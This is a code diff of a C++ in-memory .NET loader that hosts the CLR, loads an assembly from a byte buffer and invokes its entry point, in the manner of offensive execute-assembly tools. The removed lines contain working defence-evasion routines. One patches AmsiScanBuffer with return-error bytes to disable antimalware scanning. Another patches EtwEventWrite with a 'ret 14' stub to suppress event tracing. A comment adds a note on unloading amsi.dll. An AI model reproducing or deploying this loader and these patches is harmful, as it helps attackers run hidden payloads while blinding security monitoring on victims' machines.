@@ -1,3 +1,5 @@
+#pragma warning(disable : 4996)
+
 #include <metahost.h>
 #include <comutil.h>
 #include <Psapi.h>
@@ -5,6 +7,9 @@
 #include <fstream>
 #include <iostream>
 #include <vector>
+#include <evntprov.h>
+
+using namespace std;
 
 #pragma comment(lib, "mscoree.lib")
 
@@ -16,17 +21,6 @@
 using namespace mscorlib;
 #pragma endregion
 
-void CheckIfAmsiIsLoaded() {
-	printf("\n");
-	if (GetModuleHandle(L"amsi.dll")) {
-		printf("[x] AMSI.DLL Found!\n");
-	}
-	else {
-		printf("[x] AMSI.DLL not Found!\n");
-	}
-	printf("\n");
-}
-
 std::pair<PVOID, DWORD> GetShellcodeFromFile(LPCSTR Filename) {
 	HANDLE hFile = CreateFileA(Filename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
 		OPEN_EXISTING, 0, NULL); // Open the DLL
@@ -37,283 +31,187 @@ std::pair<PVOID, DWORD> GetShellcodeFromFile(LPCSTR Filename) {
 	return std::pair<PVOID, DWORD>(FileBuffer, FileSize);
 }
 
-BOOL is64bit() {
-	if (sizeof(void*) == 8) {
-		return true;
-	}
-	else {
-		return false;
-	}
-}
-
-int PatchAMSI(unsigned char Patch[])
+int main()
 {
-	printf("\n");
-	if (!GetModuleHandle(L"amsi.dll")) {
-		if (LoadLibrary(L"amsi.dll")) {
-			printf("[+] AMSI.DLL sucessfully loaded!\n");
-		}
-		else {
-			printf("[!] Loading AMSI.DLL failed, skipping AMSI patch...\n");
-			return 2;
-		}
-	}
-	printf("[*] Patching AMSI...\n");
-	void* AmsiScanBuffer = GetProcAddress(LoadLibrary(L"AMSI.DLL"), "AmsiScanBuffer");
-	if (AmsiScanBuffer != NULL) {
-		printf("[+] AmsiScanBuffer Address: %p\n", (void*)AmsiScanBuffer);
-		DWORD oldProt, oldOldProt;
-		VirtualProtect(AmsiScanBuffer, sizeof Patch, PAGE_EXECUTE_READWRITE, &oldProt);
-		if (memcpy(AmsiScanBuffer, Patch, sizeof Patch)) {
-			printf("[+] AmsiScanBuffer patch copied!\n\n");
-			VirtualProtect(AmsiScanBuffer, 4, oldProt, &oldOldProt);
-			return 1;
-		}
-		else {
-			printf("[!] Failed copying the patch to AmsiScanBuffer!\n");
-			return 2;
-		}
-	}
-	else {
-		return 2;
-	}
-}
-
-int PatchETW()
-{
-	printf("\n[*] Patching ETW...\n");
-	DWORD oldProt, oldOldProt;
-
-	// Get the EventWrite function
-	void* eventWrite = GetProcAddress(LoadLibraryA("ntdll"), "EtwEventWrite");
-	if (eventWrite != NULL) {
-		printf("[+] EtwEventWrite Address: %p\n", (void*)eventWrite);
-		// Allow writing to page
-		VirtualProtect(eventWrite, 4, PAGE_EXECUTE_READWRITE, &oldProt);
-		// Patch with "ret 14" on x86
-		if (memcpy(eventWrite, "\xc2\x14\x00\x00", 4)) {
-			printf("[+] EtwEventWrite patch copied!\n\n");
-			// Return memory to original protection
-			VirtualProtect(eventWrite, 4, oldProt, &oldOldProt);
-			return 1;
-		}
-		else {
-			printf("[!] Failed copying the patch to EtwEventWrite!\n");
-			return 2;
-		}
-	}
-	else {
-		printf("[!] Failed to get address of EtwEventWrite");
-		return 2;
-	}
-}
-
-int Execute(LPCSTR Filename, LPCSTR NamespacedotClass, LPCSTR FunctionName, LPCWSTR runtimeVersion) {
-	// .\InMemoryNET.exe ..\..\ConsoleApp1\ConsoleApp1\bin\Debug\ConsoleApp1.exe ConsoleApp1.Program EntryPoint
-
-	printf("[*] Executing File: %s\n", Filename);
-
-	unsigned char Patch64[] = "\xb8\x57\x00\x07\x80\xc3";
-	unsigned char Patch86[] = "\xb8\x57\x00\x07\x80\xC2\x18\x00";
-
-	printf("\n");
-
-	if (is64bit()) {
-		printf("[*] Architecture: x64\n");
-	}
-	else {
-		printf("[*] Architecture: x86\n");
-		PatchETW();
-	}
-
+	LPCSTR Filename = "G:\\Dropbox\\GitHub\\mez-0\\InMemoryNET\\ConsoleApp1\\ConsoleApp1\\bin\\Debug\\ConsoleApp1.exe";
 	std::pair<PVOID, DWORD> shellcodePair = GetShellcodeFromFile(Filename);
 	PVOID shellcodeBytes = shellcodePair.first;
 	DWORD shellcodeBytesLength = shellcodePair.second;
 
-	_bstr_t bstrNamespaceDotClass = _bstr_t(NamespacedotClass);
-	_bstr_t bstrFunctionName = _bstr_t(FunctionName);
+	string arguments = "args!";
+	int argsSize = arguments.length();
 
-	ICLRRuntimeInfo* pCLRRuntimeInfo = NULL;
-	ICorRuntimeHost* pCorRuntimeHost = NULL;
-	ICLRMetaHost* pCLRMetaHost = NULL;
+	ICLRMetaHost* pMetaHost = NULL;
+	ICLRRuntimeInfo* pRuntimeInfo = NULL;
+	ICorRuntimeHost* pRuntimeHost = NULL;
+	IUnknownPtr pAppDomainThunk = NULL;
+	_AppDomainPtr pDefaultAppDomain = NULL;
+	_AssemblyPtr pAssembly = NULL;
+	_MethodInfoPtr pMethodInfo = NULL;
+	SAFEARRAY* safeArrayArgs = NULL;
+	BOOL bLoadable;
 
-	DWORD hr;
+	/* Get ICLRMetaHost instance */
 
-	if (CLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&pCLRMetaHost)) != S_OK)
-	{
-		printf("[!] CLRCreatenInstance()\n");
+	if (CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&pMetaHost) != S_OK) {
+		printf("[!] Failed: CLRCreateInstance()\n");
 		return 2;
 	}
 	else {
-		printf("[+] Created Instance!\n");
+		printf("[+] Succeeded: CLRCreateInstance()\n");
 	}
 
-	if (pCLRMetaHost->GetRuntime(runtimeVersion, IID_PPV_ARGS(&pCLRRuntimeInfo)) != S_OK)
-	{
-		printf("[!] ICLRMetaHost->GetRuntime()\n");
+	if (pMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (VOID**)&pRuntimeInfo) != S_OK) {
+		printf("[!] Failed: pMetaHost->GetRuntime()\n");
 		return 2;
 	}
 	else {
-		printf("[+] Using Runtime: %S\n", runtimeVersion);
+		printf("[+] Succeeded: pMetaHost->GetRuntime()\n");
 	}
 
-	BOOL isLoadable;
-	if (pCLRRuntimeInfo->IsLoadable(&isLoadable) != S_OK)
-	{
-		printf("[!] ICLRMetaHost->IsLoadable()\n");
+	if (pRuntimeInfo->IsLoadable(&bLoadable) != S_OK) {
+		printf("[!] Failed: pRuntimeInfo->IsLoadable()\n");
 		return 2;
 	}
 	else {
-		printf("[+] isLoadable!\n");
+		printf("[+] Succeeded: pRuntimeInfo->IsLoadable()\n");
 	}
 
-	if (pCLRRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_PPV_ARGS(&pCorRuntimeHost)) != S_OK)
-	{
-		printf("[!] ICLRRuntimeInfo->GetInterface()\n");
-		return 2;
-	}
+	/* Get ICorRuntimeHost instance */
 
-	if (pCorRuntimeHost->Start() != S_OK)
-	{
-		printf("[!] ICorRuntimeHost.Start()\n");
-		return 2;
-	}
-
-	printf("[+] Started ICorRuntimeHost()\n");
-
-	IUnknownPtr spAppDomainThunk = NULL;
-	_AppDomainPtr spDefaultAppDomain = NULL;
-
-	// Get a pointer to the default AppDomain in the CLR.
-	if (pCorRuntimeHost->GetDefaultDomain(&spAppDomainThunk) != S_OK)
-	{
-		printf("[!] ICorRuntimeHost->GetDefaultDomain()\n");
+	if (pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&pRuntimeHost) != S_OK) {
+		printf("[!] Failed: pRuntimeInfo->GetInterface()\n");
 		return 2;
 	}
 	else {
-		printf("[+] Got DefaultAppDomain: %p\n", (void*)spAppDomainThunk);
+		printf("[+] Succeeded: pRuntimeInfo->GetInterface()\n");
+	}
+	if (pRuntimeHost->Start() != S_OK) {
+		printf("[!] Failed: pRuntimeHost->Start()\n");
+		return 2;
+	}
+	else {
+		printf("[+] Succeeded: pRuntimeHost->Start()\n");
 	}
 
-	if (spAppDomainThunk->QueryInterface(IID_PPV_ARGS(&spDefaultAppDomain)) != S_OK)
+	if (pRuntimeHost->GetDefaultDomain(&pAppDomainThunk) != S_OK) {
+		printf("[!] Failed: pRuntimeHost->GetDefaultDomain()\n");
+		return 2;
+	}
+	else {
+		printf("[+] Succeeded: pRuntimeHost->GetDefaultDomain()\n");
+	}
+
+	if (pAppDomainThunk->QueryInterface(__uuidof(_AppDomain), (VOID**)&pDefaultAppDomain) != S_OK) {
+		printf("[!] Failed: pAppDomainThunk->QueryInterface()\n");
+		return 2;
+	}
+	else {
+		printf("[+] Succeeded: pAppDomainThunk->QueryInterface()\n");
+	}
+
+	SAFEARRAYBOUND rgsabound[1];
+	rgsabound[0].cElements = shellcodeBytesLength;
+	rgsabound[0].lLbound = 0;
+	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
+	void* pvData = NULL;
+
+	if (SafeArrayAccessData(pSafeArray, &pvData) != S_OK) {
+		printf("[!] Failed: SafeArrayAccessData()\n");
+		return 2;
+	}
+	else {
+		printf("[+] Succeeded: SafeArrayAccessData()\n");
+	}
+
+	memcpy(pvData, shellcodeBytes, shellcodeBytesLength);
+
+	if (SafeArrayUnaccessData(pSafeArray) != S_OK) {
+		printf("[!] Failed: SafeArrayUnaccessData()\n");
+		return 2;
+	}
+	else {
+		printf("[+] Succeeded: SafeArrayUnaccessData()\n");
+	}
+
+	if (pDefaultAppDomain->Load_3(pSafeArray, &pAssembly) != S_OK) {
+		printf("[!] Failed: pDefaultAppDomain->Load_3()\n");
+		return 2;
+	}
+	else {
+		printf("[+] Succeeded: pDefaultAppDomain->Load_3()\n");
+	}
+
+	if (pAssembly->get_EntryPoint(&pMethodInfo) != S_OK) {
+		printf("[!] Failed: pAssembly->get_EntryPoint()\n");
+		return 2;
+	}
+	else {
+		printf("[+] Succeeded: pAssembly->get_EntryPoint()\n\n");
+	}
+
+	VARIANT retVal;
+	VARIANT vtPsa;
+	VARIANT obj;
+
+
+	// totally stole this: https://github.com/Hnisec/execute-assembly/blob/master/execute-assembly/execute-assembly.cpp
+	if (argsSize > 0)
 	{
-		printf("[!] IUnknownPtr->QueryInterface()\n");
-		return 2;
-	}
-
-	SAFEARRAYBOUND safeArrayBounds[1];
-	safeArrayBounds[0].cElements = shellcodeBytesLength;
-	safeArrayBounds[0].lLbound = 0;
-
-	SAFEARRAY* safeArray = SafeArrayCreate(VT_UI1, 1, safeArrayBounds);
-	SafeArrayLock(safeArray);
-	if (!memcpy(safeArray->pvData, shellcodeBytes, shellcodeBytesLength)) {
-		printf("[!] Failed to copy shellcode into safeArray!\n");
-		return 2;
-	}
-	else {
-		printf("[+] Bytes copied to: %p\n", (void*)safeArray->pvData);
-	}
-
-	SafeArrayUnlock(safeArray);
-
-	_AssemblyPtr spAssembly = NULL;
-	// https://docs.microsoft.com/en-us/dotnet/api/system.appdomain.load?view=netcore-3.1#System_AppDomain_Load_System_String_
-	// Overload 3
-	if (spDefaultAppDomain->Load_3(safeArray, &spAssembly) != S_OK) {
-		printf("[!] _AppDomainPtr->Load_3()\n");
-		return 2;
-	}
-	else {
-		printf("[+] _AppDomainPtr->Load3() was successful\n");
-	}
-
-	/*
-		After loading the assembly into the default app domain, amsi is also loaded. Originally, I was patching it here.
-		Also, you can just unload it which is funny:
-	*/
-
-	if (is64bit()) {
-		PatchAMSI(Patch64);
-	}
-	else {
-		PatchAMSI(Patch86);
-	}
-
-	/*
-	printf("\n");
-	if (GetModuleHandle(L"amsi.dll")) {
-		printf("[+] AMSI.DLL is currently loaded...\n");
-		if (FreeLibrary(GetModuleHandle(L"amsi.dll"))) {
-			printf("[+] Successfully unloaded AMSI.DLL\n");
+		vtPsa.vt = VT_ARRAY | VT_BSTR;
+		SAFEARRAYBOUND argsBound[1];
+		argsBound[0].lLbound = 0;
+		size_t argsLength = arguments.data() != NULL ? argsSize : 0;
+		argsBound[0].cElements = argsLength;
+		vtPsa.parray = SafeArrayCreate(VT_BSTR, 1, argsBound);
+		safeArrayArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
+		LPWSTR* szArglist;
+		int nArgs;
+		wchar_t* wtext = (wchar_t*)malloc((sizeof(wchar_t) * argsSize + 1));
+		mbstowcs(wtext, (char*)arguments.data(), argsSize + 1);
+		szArglist = CommandLineToArgvW(wtext, &nArgs);
+		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, nArgs);
+		for (long i = 0; i < nArgs; i++)
+		{
+			BSTR strParam1 = SysAllocString(szArglist[i]);
+			SafeArrayPutElement(vtPsa.parray, &i, strParam1);
 		}
-		else {
-			printf("[!] Failed to unload AMSI.DLL\n");
-		}
+		long iEventCdIdx(0);
+		SafeArrayPutElement(safeArrayArgs, &iEventCdIdx, &vtPsa);
+		ZeroMemory(&vtPsa, sizeof(VARIANT));
 	}
-	printf("\n");
-	*/
-
-	_TypePtr spType = NULL;
-
-	if (spAssembly->GetType_2(bstrNamespaceDotClass, &spType) != S_OK)
+	else
 	{
-		printf("[!] _AssemblyPtr.GetType_2()\n");
-		return 2;
+		// I dont know why i cant just pass a LONG 0, but i had to do all this? seems wrong
+		vtPsa.vt = VT_ARRAY | VT_BSTR;
+		SAFEARRAYBOUND argsBound[1];
+		argsBound[0].lLbound = 0;
+		size_t argsLength = arguments.data() != NULL ? argsSize : 0;
+		argsBound[0].cElements = argsLength;
+		vtPsa.parray = SafeArrayCreate(VT_BSTR, 1, argsBound);
+
+		LONG idx[1];
+		idx[0] = 0;
+
+		SAFEARRAYBOUND paramsBound[1];
+		paramsBound[0].lLbound = 0;
+		paramsBound[0].cElements = 1;
+		safeArrayArgs = SafeArrayCreate(VT_VARIANT, 1, paramsBound);
+		SafeArrayPutElement(safeArrayArgs, idx, &vtPsa);
+		ZeroMemory(&vtPsa, sizeof(VARIANT));
 	}
 
-	SAFEARRAY* psaStaticMethodArgs = NULL;
-	variant_t vtStringArg(L"");
-	variant_t vtPSEntryPointReturnVal;
-	variant_t vtEmpty;
+	ZeroMemory(&retVal, sizeof(VARIANT));
+	ZeroMemory(&obj, sizeof(VARIANT));
+	obj.vt = VT_NULL;
 
-	psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
-	LONG index = 0;
-
-	if (SafeArrayPutElement(psaStaticMethodArgs, &index, &vtStringArg) != S_OK) {
-		printf("[!] SafeArrayPutElement()\n");
+	if (pMethodInfo->Invoke_3(obj, safeArrayArgs, &retVal) != S_OK) {
+		printf("[!] Failed: pMethodInfo->Invoke_3() failed\n");
 		return 2;
 	}
-
-	printf("[*] Executing %s.%s()\n", NamespacedotClass, FunctionName);
-	printf("\n====================================\n");
-
-	// Invoke the method from the Type interface.
-	if (spType->InvokeMember_3(
-		bstrFunctionName,
-		static_cast<BindingFlags>(BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public),
-		NULL,
-		vtEmpty,
-		psaStaticMethodArgs,
-		&vtPSEntryPointReturnVal) != S_OK)
-	{
-		printf("[!] _TypePtr.InvokeMember_3()\n");
-		return 2;
+	else {
+		printf("\n[+] Succeeded: pMethodInfo->Invoke_3() succeeded\n");
 	}
 
-	printf("====================================\n\n");
-	printf("[+] Successfully Invoked .NET!\n");
-	SafeArrayDestroy(psaStaticMethodArgs);
-	psaStaticMethodArgs = NULL;
 	return 0;
-}
-
-int main(int argc, char** argv)
-{
-	/* Arguments:
-	if (argc < 4)
-	{
-		printf("[!] .\\InMemoryNet.exe <PathToExe> <Namespace.Class> <Method>\n");
-		return 2;
-	}
-	LPCSTR Filename = argv[1];
-	LPCSTR NamespacedotClass = argv[2];
-	LPCSTR FunctionName = argv[3];
-	*/
-
-	LPCSTR Filename = "C:\\Users\\Desktop\\mez0\\InMemoryNET\\ConsoleApp1\\ConsoleApp1\\bin\\Debug\\ConsoleApp1.exe";
-	LPCSTR NamespacedotClass = "ConsoleApp1.Program";
-	LPCSTR FunctionName = "EntryPoint";
-	LPCWSTR runtimeVersion = L"v4.0.30319";
-	
-	Execute(Filename, NamespacedotClass, FunctionName, runtimeVersion);
 }
